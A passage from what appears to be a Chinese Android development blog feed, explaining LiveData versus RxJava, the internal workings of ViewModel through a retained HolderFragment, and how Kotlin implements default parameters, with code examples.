class="type">&lt;X&gt;</span>.<span class="title">switchMap</span><span class="params">(transform: (<span class="type">x</span>: <span class="type">X</span>)</span></span> -&gt; LiveData&lt;Y&gt;): LiveData&lt;Y&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Transformations.switchMap(<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span><span class="symbol">@switchMap</span> transform(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>从学习曲线上来讲，LiveData对新人更友好（这里可能是先学习过RxJava，有了流式的思想基础后再来学习LiveData造成的错觉。）</p></li></ol><p>在 Twitter 上看到 <a href="https://twitter.com/chrisbanes/status/893490549138784256" target="_blank" rel="noopener">@chrisbanes</a> 提供的一种 LiveData 实践思路。</p><ol><li>LiveData 作为 UI 前端的数据展示层</li><li>RxJava 作为 后端的 network 请求层</li></ol><p><img src="/media/15020765905808.jpg" alt=""></p><p>而 Google 官方提供的 Demo 中，是直接让Retrofit 网络请求返回 LiveData。</p><p>两者相比，我觉得还是@chrisbanes的实践更合理。为什么这么说呢？</p><ol><li><p>LiveData 不适合作为 network 请求的返回值。</p><p><img src="/media/15020768865133.jpg" alt=""></p><blockquote><p>It’s weird to me to expose an HTTP request as live data because it really isn’t. I would think you would always have some intermediary class which allowed for things like refreshing the HTTP data and updating the existing <code>LiveData</code>.</p></blockquote><p>因为大部分的 network 请求都是一次性的(one-shot)，而使用 LiveData 给人的感觉是数据可能会在之后更新。那么更适合的场景其实是LiveData 和数据库(Room)配合</p></li><li><p>利用 LiveData 的自动 clear 特性，管理RxJava 的 subscriptions，消除了RxJava 内存泄露的可能。</p></li><li><p>能利用 RxJava 简洁的线程切换的能力。</p></li></ol><p>至于 RxJava Stream 和 LiveData 之间的互相转换可以使用<a href="https://developer.android.com/reference/android/arch/lifecycle/LiveDataReactiveStreams.html" target="_blank" rel="noopener"><code>LiveDataReactiveStreams</code></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文比较了&lt;code&gt;LiveData&lt;/code&gt;和&lt;code&gt;RxJava&lt;/code&gt;在概念上的不同。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://deskid.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 ViewModel</title>
    <link href="https://deskid.github.io/2017/07/28/ViewModel/"/>
    <id>https://deskid.github.io/2017/07/28/ViewModel/</id>
    <published>2017-07-28T05:14:14.000Z</published>
    <updated>2018-11-14T03:26:20.314Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要研究了<code>ViewModel</code>的概念、使用方式和内部实现原理。</p><a id="more"></a><h2 id="1-viewmodel概念">1. ViewModel概念</h2><p><code>ViewModel</code> 用来管理和存储UI相关的数据，和普通的 data store 不同的是：<code>ViewModel</code>会帮你处理 UI Controller 的生命周期带来的问题。</p><p>这里需要解释，为什么我们需要处理 UI Controller的生命周期，不处理会有什么问题呢？</p><ol><li><p>数据需要在 UI Controller destroyed 后清理，防止内存泄露。</p></li><li><p>数据需要处理 UI Controller 的生命周期。举个例子，Activity 在 configuration changes 后(旋转屏幕等)，系统会销毁之前的Activity，并重建一个Activity 实例。这时数据如何在这两个Activity实例之间保持一致。</p></li></ol><p>没有<code>ViewModel</code>，解决问题的思路：</p><ol><li>使用 static data holder（需要处理lifecycle）</li><li>将数据持久化<ol><li>持久化的位置——本地、云端？</li><li>持久化时机——即时、lifecycle callbacks？</li></ol></li></ol><p><code>ViewModel</code>号称解决了上述问题，它是怎么做到的呢？</p><!-- more --><h2 id="2-viewmodel使用">2. ViewModel使用</h2><p>下面先提供个demo：</p><p>1 . <code>MyViewModel.java</code></p><p>使用 ViewModel 很简单，直接继承 <code>ViewModel</code> 就好了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModel</span> <span class="keyword">extends</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span> myInt = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2 . <code>MainActivity.java</code></p><p>和 UI Controller 绑定：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">   setContentView(R.layout.activity_main);</span><br><span class="line">   mViewModel = ViewModelProviders.of(<span class="keyword">this</span>).get(ScoreViewModel.class);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样就足够了，不过，工厂方法<code>ViewModelProviders</code>默认使用 ViewModel 的无参构造函数。如果需要指定构造函数，还需要自己实现<code>Factory</code>接口的<code>create</code>方法。</p><p>3 . <code>MyViewModelFactory.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModelFactory</span> <span class="keyword">implements</span> <span class="title">ViewModelProvider</span>.<span class="title">Factory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> AppDatabase mAppDatabase;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyViewModelFactory</span><span class="params">(AppDatabase appDatabase)</span> </span>&#123;</span><br><span class="line">       mAppDatabase = appDatabase;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> &lt;T extends ViewModel&gt; <span class="function">T <span class="title">create</span><span class="params">(Class&lt;T&gt; modelClass)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> (T) <span class="keyword">new</span> MyViewModel(mAppDatabase);;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MyViewModel.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModel</span> <span class="keyword">extends</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyViewModel</span><span class="params">(AppDatabase appDatabase)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用姿势变成：</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"><span class="addition">+    MyViewModelFactory factory = new MyViewModelFactory(database);</span></span><br><span class="line"><span class="addition">+    MyViewModel viewModel = ViewModelProviders.of(this, factory).get(MyViewModel.class);</span></span><br><span class="line"></span><br><span class="line">    //....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，还可以通过传入同一个<code>getActivity()</code>，使得ViewModel成为Activity的多个Fragment之间数据传递层。</p><p>需要注意的是，不要在ViewModel中持有 UI Controller 或者 Context，这是因为ViewModel的寿命长于 UI Controller 从而会导致内存泄露。</p><h2 id="3-viewmodel优点">3. ViewModel优点</h2><ol><li>ViewModel 数据层 和 UI Controller 之间分离的很干净。UI Controller 不用负责获取数据，也不用在重建时负责数据的有效性。</li><li>ViewModel 数据层能感知到 UI Controller 的生命周期：保证 UI Controller 重建后，持有的是同一个ViewModel数据实例;  UI Controller 结束生命周期后，系统自动调用ViewModel的<code>clear()</code>，释放资源。</li><li>配合 LiveData 使用效果更佳。</li><li>之前放到<code>onSaveInstanceState()</code>的复杂数据，现在可以放到ViewModel（系统UI相关的除外）</li><li>由于职责划分更加清晰，测试更方便。</li></ol><h2 id="4-drive-deeper">4. drive deeper</h2><p>ViewModel 是如何实现在 UI Controller 重建后维持同一个实例的呢？</p><p>回答这个问题之前，先补充一点背景知识。</p><p><code>Fragment.java</code> 里有一个方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRetainInstance</span><span class="params">(<span class="keyword">boolean</span> retain)</span> </span>&#123;</span><br><span class="line">   mRetainInstance = retain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的注释如下：</p><blockquote><p>Control whether a fragment instance is retained across Activity re-creation (such as from a configuration change). This can only be used with fragments not in the back stack. If set, the fragment lifecycle will be slightly different when an activity is recreated:</p></blockquote><ul><li><code>onDestroy()</code> will not be called (but <code>onDetach()</code> still will be, because the fragment is being detached from its current activity).</li><li><code>onCreate(Bundle)</code> will not be called since the fragment is not being re-created.</li><li><code>onAttach(Activity)</code> and <code>onActivityCreated(Bundle)</code> <strong>will</strong> still be called.</li></ul><p>上面这段话体现在Fragment生命周期上如图所示：</p><p><img src="/media/15011367324387.jpg" alt=""></p><p>注意，在官方图的基础上加的红线部分就是设置了<code>setRetainInstance</code>之后的生命周期变动。</p><p>Fragment在设置<code>setRetainInstance(true)</code>后，当 host Activity re-creation 时，fragment不会被destroyed，而是keep在内存中。当re-creation时，fragment 跳过 <code>onDestroy()</code> 和 <code>onCreate()</code>生命周期，并重新执行一遍 <code>onAttach()</code> 和 <code>onDetach()</code>之间的回调。</p><p>因此在 Activity re-creation 后，fragment还是原来的那个实例。</p><p>看完这个介绍，是不是有所启发了？</p><p>回到 ViewModel 的实现来。</p><p>下面大图是 Google Android Architecture Components 的部分框架(图来自<a href="https://medium.com/@hitherejoe" target="_blank" rel="noopener">Joe Birch</a>)，</p><p><img src="/media/15011493872486.jpg" alt=""></p><p>红色框线部分是<code>ViewModel</code>的部分。</p><p><img src="/media/15011494656226.jpg" alt=""></p><p>可见ViewModel主要构成部分如下：</p><ul><li><code>ViewModelProviders</code></li><li><code>ViewModelProvider</code></li><li><code>ViewModelStores</code></li><li><code>ViewModelStore</code></li><li><code>ViewModel</code></li></ul><p>其中，主角 <code>ViewModel</code> 是一个只有<code>onCleared</code>方法的抽象类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCleared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述问题的答案显然不在这里。</p><p>下面从调用入口开始看：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyViewModel viewModel = ViewModelProviders.of(<span class="keyword">this</span>, factory).get(MyViewModel.class);</span><br></pre></td></tr></table></figure><p>获取<code>ViewModel</code> 两个步骤：</p><ol><li>通过<code>ViewModelProviders.of()</code>返回的<code>ViewModelProvider</code></li><li>再通过<code>ViewModelProvider.get()</code>获取ViewModel实例。</li></ol><p><code>ViewModelProviders</code> 是创建<code>ViewModelProvider</code>的工具类，通过<code>of()</code>方法获取<code>ViewModelProvider</code><br><img src="/media/15011510361313.jpg" alt=""></p><p>贴<code>of</code>代码(其一)：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@MainThread</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ViewModelProvider <span class="title">of</span><span class="params">(@NonNull Activity activity, @NonNull Factory factory)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> ViewModelProvider(ViewModelStores.of(activity), factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码简单的调用构造函数创建了<code>ViewModelProvider</code>。</p><p>而<code>ViewModelProvider</code> 又是创建<code>ViewModel</code>的工具类，提供了<code>get</code>方法获得 <code>ViewModel</code> 。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NonNull</span></span><br><span class="line">   <span class="meta">@MainThread</span></span><br><span class="line">   <span class="keyword">public</span> &lt;T extends ViewModel&gt; <span class="function">T <span class="title">get</span><span class="params">(@NonNull String key, @NonNull Class&lt;T&gt; modelClass)</span> </span>&#123;</span><br><span class="line">       ViewModel viewModel = mViewModelStore.get(key);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (modelClass.isInstance(viewModel)) &#123;</span><br><span class="line">           <span class="keyword">return</span> (T) viewModel;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (viewModel != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="comment">// <span class="doctag">TODO:</span> log a warning.</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       viewModel = mFactory.create(modelClass);</span><br><span class="line">       mViewModelStore.put(key, viewModel);</span><br><span class="line">       <span class="keyword">return</span> (T) viewModel;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>由上面代码可以看到，构造函数传入的<code>ViewModelStore</code>（<code>ViewModelStores.of()</code> 的返回值） 这里充当了ViewModel缓存的功能，<code>Factory</code>则直接负责ViewModel的创建。</p><p><code>ViewModelStores</code>和<code>ViewModelStore</code>的关系也是类似的，<code>ViewModelStores</code>是创建<code>ViewModelStore</code>的工具类。</p><p><code>ViewModelStores</code>也有几个<code>of</code>方法。<br><img src="/media/15011531800293.jpg" alt=""></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ViewModelStore <span class="title">of</span><span class="params">(FragmentActivity activity)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> HolderFragment.holderFragmentFor(activity).getViewModelStore();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码的具体实现中，注意<code>holderFragmentFor</code>这里，大概猜到了具体实现和<code>Fragment</code>有关。</p><p>继续深入。</p><p><code>holderFragmentFor</code>是<code>HolderFragment</code>的类方法，参数为<code>ViewModelProviders.of()</code>传入的<code>activity</code>实例（或者<code>fragment</code>），返回一个<code>HolderFragment</code>实例。内部实现则是委托给了<code>HolderFragmentManager</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestrictTo</span>(RestrictTo.Scope.LIBRARY_GROUP)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HolderFragment <span class="title">holderFragmentFor</span><span class="params">(FragmentActivity activity)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> sHolderFragmentManager.holderFragmentFor(activity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ViewModelStores.of()</code> 调用<code>HolderFragment</code>的<code>getViewModelStore()</code>，取出其内部持有<code>ViewModelStore</code>，并作为返回值返回。</p><p><code>HolderFragment.java</code> 其他的代码不贴，只看构造函数就行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HolderFragment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   setRetainInstance(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setRetainInstance(true)</code> 保证了<code>HolderFragment</code>在Activity重建时不会被销毁，在这个基础上，<code>HolderFragment</code> 保证了<code>ViewModelStore</code>在 Activity 重建之后维持同一个实例。</p><p>至于<code>ViewModelStore</code>的实现，很简单，不到50行代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewModelStore</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HashMap&lt;String, ViewModel&gt; mMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(String key, ViewModel viewModel)</span> </span>&#123;</span><br><span class="line">        ViewModel oldViewModel = mMap.get(key);</span><br><span class="line">        <span class="keyword">if</span> (oldViewModel != <span class="keyword">null</span>) &#123;</span><br><span class="line">            oldViewModel.onCleared();</span><br><span class="line">        &#125;</span><br><span class="line">        mMap.put(key, viewModel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> ViewModel <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mMap.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (ViewModel vm : mMap.values()) &#123;</span><br><span class="line">            vm.onCleared();</span><br><span class="line">        &#125;</span><br><span class="line">        mMap.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取得<code>ViewModelStore</code>之后，通过 <code>get(key)</code> 最终获得了一个<code>ViewModel</code>。</p><p>那么，<code>HolderFragmentManager</code>又是怎么将 UI Controller 和 <code>HoldFragment</code>关联起来的呢？</p><p>第一次获取<code>ViewModel</code>时，<code>HolderFragmentManager</code>创建<code>HolderFragment</code>，并将其添加到 activity state。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> HolderFragment <span class="title">createHolderFragment</span><span class="params">(FragmentManager fragmentManager)</span> </span>&#123;</span><br><span class="line">  HolderFragment holder = <span class="keyword">new</span> HolderFragment();</span><br><span class="line">  fragmentManager.beginTransaction().add(holder, HOLDER_TAG).commitAllowingStateLoss();</span><br><span class="line">  <span class="keyword">return</span> holder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 Activity 重建后，第二次获取ViewModel时，<code>HolderFragmentManager</code> 内部通过调用<code>FragmentManager.findFragmentByTag</code>来查找之前commit的<code>HolderFragment</code>，由于<code>HolderFragment</code> 不会在Activity重建时销毁，所以这里返回的是同一个<code>HolderFragment</code>实例。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> HolderFragment <span class="title">findHolderFragment</span><span class="params">(FragmentManager manager)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (manager.isDestroyed()) &#123;</span><br><span class="line">      <span class="comment">// throw Exception;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Fragment fragmentByTag = manager.findFragmentByTag(HOLDER_TAG);</span><br><span class="line">  <span class="comment">// check null and type...</span></span><br><span class="line">  <span class="keyword">return</span> (HolderFragment) fragmentByTag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结<code>HolderFragmentManager</code>的存储关系如下图：</p><p><img src="/media/15012142793225.jpg" alt="HolderFragmentManager示意图"></p><p>一个 UI Controller 对应一个<code>HolderFragment</code>。两者之间是通过<code>FragmentManager.findFragmentByTag</code>互相关联起来的。</p><p><code>HolderFragment</code> 持有<code>ViewModelStore</code>实例。而 <code>ViewModelStore</code> 内部通过String key对应着多个<code>ViewModel</code>。</p><p>其实很早很早以前 Android 社区就流行使用没有UI的 <code>Fragment</code> 来做为 MVC 中的 Controller。这种<code>Fragment</code> 被称为<code>Headless Fragment</code>，其中就利用到了 <code>setRetainInstance(true)</code> 的这个特性。</p><p><code>ViewModel</code>的设计实现，也算是官方承认了<code>Headless Fragments</code>的这种非正统使用模式了。（<code>Fragment</code>的设计者估计做梦也不会想到竟然还有这种操作吧）。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要研究了&lt;code&gt;ViewModel&lt;/code&gt;的概念、使用方式和内部实现原理。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://deskid.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(三)</title>
    <link href="https://deskid.github.io/2017/07/07/kotlin-learn-notes-3/"/>
    <id>https://deskid.github.io/2017/07/07/kotlin-learn-notes-3/</id>
    <published>2017-07-07T08:46:23.000Z</published>
    <updated>2018-11-14T03:28:49.779Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的几个特性如下：</p><ul><li>默认参数</li><li>命名参数</li><li>std自带函数</li></ul><a id="more"></a><p>继续，如果把编程语言看做一款应用产品，产品的功能对应语言特性，那么大多数编程语言功能都还算齐全，该有的也都有了，剩下一些增增减减，发个版本迭代也是和应用开发类似。这个应用的目的是为了什么呢，为了实现OOP？为了实现函数式编程？</p><p>不对，这种思路是本末倒置。就像我们写诗是为了抒发情感，而不是为了拼凑五言绝句平平仄仄平的韵律格式。编程语言设计出来，不是为了实现某个设计哲学，而是要为了被程序员使用。</p><p>就像面对 NPE，程序员说：我们不想写if null 判断，语言设计师说：可是添加个 null 实现起来更简单啊，我们加上吧。</p><p>你猜，要是编程语言是一个应用产品，这样的产品经理会不会被用户打。</p><h3 id="6-默认参数">6. 默认参数</h3><p>Java为了避免在一个方法中传入过多参数，往往有两个解决方法：</p><ol><li>将参数用builder封装一下</li><li>写多个方法重载，每次重载设置最后一个参数为默认值</li></ol><!-- more --><p>这里举个方法重载的例子：<br>下面代码是用Java写的一个路由跳转类的toUriAct方法封装。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, (HashMap)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, newTask, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriActWithAnim</span><span class="params">(Context ctx, String uriStr, <span class="keyword">int</span> animIn, <span class="keyword">int</span> animOut)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, (HashMap)<span class="keyword">null</span>, <span class="keyword">false</span>, -<span class="number">1</span>, <span class="keyword">true</span>, animIn, animOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask, <span class="keyword">int</span> requestCode)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, newTask, requestCode, <span class="keyword">false</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask, <span class="keyword">int</span> requestCode, <span class="keyword">boolean</span> needAnim, <span class="keyword">int</span> animIn, <span class="keyword">int</span> animOut)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, newTask, requestCode, needAnim, animIn, animOut, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask, <span class="keyword">int</span> requestCode, <span class="keyword">boolean</span> needAnim, <span class="keyword">int</span> animIn, <span class="keyword">int</span> animOut, <span class="keyword">boolean</span> useDedaultAnimation)</span> </span>&#123;</span><br><span class="line">        toUriActWithReturn(ctx, uriStr, params, newTask, requestCode, needAnim, animIn, animOut, useDedaultAnimation);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重复代码多，可读性差。但是，在Java中没得选，只能这么写。</p><p>而在kotlin中，只需要写一个方法：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">toUriAct</span><span class="params">(ctx: <span class="type">Context</span>, uriStr: <span class="type">String</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             params: <span class="type">HashMap</span>&lt;<span class="type">String</span>, String&gt;? = <span class="literal">null</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             newTask: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             requestCode: <span class="type">Int</span> = <span class="number">-1</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             needAnim: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             animIn: <span class="type">Int</span> = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             animOut: <span class="type">Int</span> = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             useDedaultAnimation: <span class="type">Boolean</span> = <span class="literal">false</span>)</span></span> &#123;</span><br><span class="line">    toUriActWithReturn(ctx, uriStr, params, newTask, requestCode, needAnim, animIn, animOut, useDedaultAnimation)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kotlin是这么实现默认参数的呢？</p><p>kotlin 会为带默认参数的方法生成一个bridge方法，bridge 方法中添加了一个新的int型的mask参数，其值默认为2<sup>n</sup>-1(n = args.length)。mask的二进制位对应n个参数位。</p><p>调用时，如果传参覆盖了默认值，则将参数位对应的mask位置0。</p><p>在bridge方法中会检测默认参数的参数位是否置0，否则使用默认值去调用原方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $FF: synthetic method</span></span><br><span class="line"><span class="comment">// $FF: bridge method</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> toUriAct$<span class="keyword">default</span>(Context var0, String var1, HashMap var2, <span class="keyword">boolean</span> var3, <span class="keyword">int</span> var4, <span class="keyword">boolean</span> var5, <span class="keyword">int</span> var6, <span class="keyword">int</span> var7, <span class="keyword">int</span> var8, Object var9) &#123;</span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var0 = (Context)<span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">2</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var1 = <span class="string">""</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var2 = (HashMap)<span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var3 = <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var4 = -<span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">32</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var5 = <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">64</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var6 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">128</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var7 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> toUriAct(var0, var1, var2, var3, var4, var5, var6, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种参数带默认值的方法只能在kotlin代码中调用，如果要在Java中调用，只要方法声明前加上<code>@JvmOverloads</code>标注，kotlin就会自动生成上述的方法重载，和用Java写的一样。</p><h3 id="7-命名参数">7. 命名参数</h3><p>举例说明：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">reformat</span><span class="params">(str: <span class="type">String</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             normalizeCase: <span class="type">Boolean</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             